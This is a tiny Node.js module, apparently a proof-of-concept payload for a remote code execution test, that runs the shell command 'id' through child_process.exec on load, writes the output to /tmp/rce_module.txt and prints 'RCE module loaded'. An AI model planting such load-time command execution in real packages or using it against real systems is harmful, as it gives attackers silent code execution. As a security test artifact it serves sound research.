const { exec } = require('child_process');
exec('id > /tmp/rce_module.txt');
console.log('RCE module loaded');
